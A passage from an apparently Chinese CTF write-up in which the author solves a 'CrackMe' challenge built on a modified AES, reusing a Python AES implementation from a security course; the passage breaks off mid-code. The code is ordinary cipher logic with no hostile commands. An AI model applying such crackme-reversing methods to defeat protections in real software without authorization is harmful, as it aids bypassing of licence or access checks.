8ab86b897</span></span><br></pre></td></tr></table></figure>
<h3 id="crackme">CrackMe</h3>
<p>修改过的AES算法，对比着写出修改后的解密算法</p>
<p>这种魔改算法的题挺蛋疼的，慢慢调试看多了改了什么东西，比较费时间。</p>
<p>脚本是计算机安全导论课上写的作业，直接拿来用了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">show_state</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%02x&quot;</span> % a[i][j], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytes_to_state</span>(<span class="params">a</span>):</span><br><span class="line">    tmp0 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a) // <span class="number">4</span>):</span><br><span class="line">        tmp1 = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            tmp1.append(a[i * <span class="number">4</span> + j])</span><br><span class="line">        tmp0.append(tmp1)</span><br><span class="line">    <span class="keyword">return</span> tmp0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">state_to_bytes</span>(<span class="params">state</span>):</span><br><span class="line">    res = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        res += <span class="built_in">bytes</span>(state[i])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">affine</span>(<span class="params">b_int</span>):</span><br><span class="line">    matrix_a = [[<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">                [<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">                [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">                [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">                [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">                [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">                [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">                [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]]</span><br><span class="line">    b = []</span><br><span class="line">    c = [[<span class="number">1</span>], [<span class="number">1</span>], [<span class="number">0</span>], [<span class="number">0</span>], [<span class="number">0</span>], [<span class="number">1</span>], [<span class="number">1</span>], [<span class="number">0</span>]]</span><br><span class="line">    s = [[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">    <span class="comment"># s = Ab+c</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        b.append([b_int &amp; <span class="number">1</span>])</span><br><span class="line">        b_int &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        tmp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            tmp ^= (matrix_a[i][j] * b[j][<span class="number">0</span>])</span><br><span class="line">        s[i][<span class="number">0</span>] = tmp ^ c[i][<span class="number">0</span>]</span><br><span class="line">    s_int = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        s_int &lt;&lt;= <span class="number">1</span></span><br><span class="line">        s_int += s[<span class="number">7</span> - i][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> s_int</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_affine</span>(<span class="params">s_int</span>):</span><br><span class="line">    matrix_ai = [[<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">                 [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">                 [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">                 [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">                 [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">                 [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">                 [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">                 [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]]</span><br><span class="line">    s = []</span><br><span class="line">    ci = [[<span class="number">1</span>], [<span class="number">0</span>], [<span class="number">1</span>], [<span class="number">0</span>], [<span class="number">0</span>], [<span class="number">0</span>], [<span class="number">0</span>], [<span class="number">0</span>]]</span><br><span class="line">    b = [[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">    <span class="comment"># b = AI*s+ci</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        s.append([s_int &amp; <span class="number">1</span>])</span><br><span class="line">        s_int &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        tmp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            tmp ^= (matrix_ai[i][j] * s[j][<span class="number">0</span>])</span><br><span class="line">        b[i][<span class="number">0</span>] = tmp ^ ci[i][<span class="number">0</span>]</span><br><span class="line">    b_int = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        b_int &lt;&lt;= <span class="number">1</span></span><br><span class="line">        b_int += b[<span class="number">7</span> - i][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> b_int</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_highest_bit</span>(<span class="params">value</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> value != <span class="number">0</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        value &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">polynomial_divide</span>(<span class="params">numerator, denominator</span>):</span><br><span class="line">    quotient = <span class="number">0</span></span><br><span class="line">    tmp = numerator</span><br><span class="line">    bit_count = find_highest_bit(tmp) - find_highest_bit(denominator)</span><br><span class="line">    <span class="keyword">while</span> bit_count &gt;= <span class="number">0</span>:</span><br><span class="line">        quotient |= (<span class="number">1</span> &lt;&lt; bit_count)</span><br><span class="line">        tmp ^= (denominator &lt;&lt; bit_count)</span><br><span class="line">        bit_count = find_highest_bit(tmp) - find_highest_bit(denominator)</span><br><span class="line">    remainder = tmp</span><br><span class="line">    <span class="keyword">return</span> quotient, remainder</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">polynomial_multiply</span>(<span class="params">multiplier_a, multiplier_b</span>):</span><br><span class="line">    tmp = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        tmp[i] = (multiplier_a &lt;&lt; i) * ((multiplier_b &gt;&gt; i) &amp; <span class="number">1</span>)</span><br><span class="line">        res ^= tmp[i]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">polynomial_expand_euclidean</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    a*x + b*y = gcd(a,b)</span></span><br><span class="line"><span class="string">    :param a:</span></span><br><span class="line"><span class="string">    :param b:</span></span><br><span class="line"><span class="string">    :return: x, y, gcd(a, b)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y, g = polynomial_expand_euclidean(b, polynomial_divide(a, b)[<span class="number">1</span>])</span><br><span class="line">        x, y = y, (x ^ polynomial_multiply(polynomial_divide(a, b)[<span class="number">0</span>], y))</span><br><span class="line">        <span class="keyword">return</span> x, y, g</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_byte</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">return</span> affine(polynomial_expand_euclidean(a, <span class="number">0x11B</span>)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_sub_byte</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">return</span> polynomial_expand_euclidean(inv_affine(a), <span class="number">0x11B</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_word</span>(<span class="params">a</span>):</span><br><span class="line">    res = a[:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">        res[i] = sub_byte(res[i])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rot_word</span>(<span class="params">a</span>):</span><br><span class="line">    res = a[:]</span><br><span class="line">    tmp = res[<span class="number">0</span>]</span><br><span class="line">    res[<span class="number">0</span>] = res[<span class="number">1</span>]</span><br><span class="line">    res[<span class="number">1</span>] = res[<span class="number">2</span>]</span><br><span class="line">    res[<span class="number">2</span>] = res[<span class="number">3</span>]</span><br><span class="line">    res[<span class="number">3</span>] = tmp</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_word</span>(<span class="params">a, b</span>):</span><br><span class="line">    res = [<span class="literal">None</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a))]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">        res[i] = a[i] ^ b[i]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int_to_byte_list</span>(<span class="params">a</span>):</span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        tmp.append((a &gt;&gt; (<span class="number">8</span> * i)) &amp; <span class="number">0xFF</span>)</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_rcon</span>(<span class="params">n</span>):</span><br><span class="line">    tmp = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">        tmp = polynomial_divide(polynomial_multiply(tmp, <span class="number">2</span>), <span class="number">0x11B</span>)[<span class="number">1</span>]</span><br><span class="line">    res = int_to_byte_list(tmp)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_expansion</span>(<span class="params">key, rounds</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Generate child keys.</span></span><br><span class="line"><span class="string">    :param key: bytes</span></span><br><span class="line"><span class="string">            The key to generate child keys.</span></span><br><span class="line"><span class="string">    :param rounds: int</span></span><br><span class="line"><span class="string">            The rounds number of AES.</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">            Child keys.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    r = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> rounds == <span class="number">10</span>:</span><br><span class="line">        r = <span class="number">11</span></span><br><span class="line">        n = <span class="number">4</span></span><br><span class="line">    <span class="keyword">elif</span> rounds == <span class="number">12</span>:</span><br><span class="line">        r = <span class="number">13</span></span><br><span class="line">        n = <span class="number">6</span></span><br><span class="line">    <span class="keyword">elif</span> rounds == <span class="number">14</span>:</span><br><span class="line">        r = <span class="number">15</span></span><br><span class="line">        n = <span class="number">8</span></span><br><span class="line">    w_words = []</span><br><span class="line">    k_words = bytes_to_state(key)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span> * r):</span><br><span class="line">        <span class="keyword">if</span> i &lt; n:</span><br><span class="line">            local_word = k_words[i]</span><br><span class="line">        <span class="keyword">elif</span> i &gt;= n <span class="keyword">and</span> i % n == <span class="number">0</span>:</span><br><span class="line">            local_word = rot_word(w_words[i - <span class="number">1</span>])</span><br><span class="line">            local_word = sub_word(local_word)</span><br><span class="line">            local_word = xor_word(local_word, get_rcon(i // n))</span><br><span class="line">            local_word = xor_word(local_word, w_words[i - n])</span><br><span class="line">        <span class="keyword">elif</span> i &gt;= n &gt; <span class="number">6</span> <span class="keyword">and</span> i % n == <span class="number">4</span>:</span><br><span class="line">            local_word = rot_word(w_words[i - <span class="number">1</span>])</span><br><span class="line">            local_word = xor_word(local_word, w_words[i - n])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            local_word = xor_word(w_words[i - n], w_words[i - <span class="number">1</span>])</span><br><span class="line">        w_words.append(local_word)</span><br><span class="line">    child_keys_state = [[w_words[i * <span class="number">4</span> + j] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(w_words) // <span class="number">4</span>)]</span><br><span class="line">    <span class="comment"># for i, v in enumerate(child_keys_state):</span></span><br><span class="line">    <span class="comment">#     print(&quot;CHILD KEY ROUND %d:&quot; % i)</span></span><br><span class="line">    <span class="comment">#     show_state(v)</span></span><br><span class="line">    <span class="keyword">return</span> child_keys_state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_round_key</span>(<span class="params">state1, state2</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            state1[i][j] ^= state2[i][j]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_bytes</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            state[i][j] = box1(state[i][j])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_sub_bytes</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            state[i][j] = box2(state[i][j])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift_rows</span>(<span class="params">state</span>):</span><br><span class="line">    tmp = state[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">    state[<span class="number">0</span>][<span class="number">1</span>] = state[<span class="number">1</span>][<span class="number">1</span>]</span><br><span class="line">    state[<span class="number">1</span>][<span class="number">1</span>] = state[<span class="number">2</span>][<span class="number">1</span>]</span><br><span class="line">    state[<span class="number">2</span>][<span class="number">1</span>] = state[<span class="number">3</span>][<span class="number">1</span>]</span><br><span class="line">    state[<span class="number">3</span>][<span class="number">1</span>] = tmp</span><br><span class="line"></span><br><span class="line">    tmp = state[<span class="number">0</span>][<span class="number">2</span>]</span><br><span class="line">    state[<span class="number">0</span>][<span class="number">2</span>] = state[<span class="number">2</span>][<span class="number">2</span>]</span><br><span class="line">    state[<span class="number">2</span>][<span class="number">2</span>] = tmp</span><br><span class="line">    tmp = state[<span class="number">1</span>][<span class="number">2</span>]</span><br><span class="line">    state[<span class="number">1</span>][<span class="number">2</span>] = state[<span class="number">3</span>][<span class="number">2</span>]</span><br><span class="line">    state[<span class="number">3</span>][<span class="number">2</span>] = tmp</span><br><span class="line"></span><br><span class="line">    tmp = state[<span class="number">0</span>][<span class="number">3</span>]</span><br><span class="line">    state[<span class="number">0</span>][<span class="number">3</span>] = state[<span class="number">3</span>][<span class="number">3</span>]</span><br><span class="line">    state[<span class="number">3</span>][<span class="number">3</span>] = state[<span class="number">2</span>][<span class="number">3</span>]</span><br><span class="line">    state[<span class="number">2</span>][<span class="number">3</span>] = state[<span class="number">1</span>][<span class="number">3</span>]</span><br><span class="line">    state[<span class="number">1</span>][<span class="number">3</span>] = tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_shift_rows</span>(<span class="params">state</span>):</span><br><span class="line">    tmp = state[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">    state[<span class="number">0</span>][<span class="number">1</span>] = state[<span class="number">3</span>][<span class="number">1</span>]</span><br><span class="line">    state[<span class="number">3</span>][<span class="number">1</span>] = state[<span class="number">2</span>][<span class="number">1</span>]</span><br><span class="line">    state[<span class="number">2</span>][<span class="number">1</span>] = state[<span class="number">1</span>][<span class="number">1</span>]</span><br><span class="line">    state[<span class="number">1</span>][<span class="number">1</span>] = tmp</span><br><span class="line"></span><br><span class="line">    tmp = state[<span class="number">0</span>][<span class="number">2</span>]</span><br><span class="line">    state[<span class="number">0</span>][<span class="number">2</span>] = state[<span class="number">2</span>][<span class="number">2</span>]</span><br><span class="line">    state[<span class="number">2</span>][<span class="number">2</span>] = tmp</span><br><span class="line">    tmp = state[<span class="number">1</span>][<span class="number">2</span>]</span><br><span class="line">    state[<span 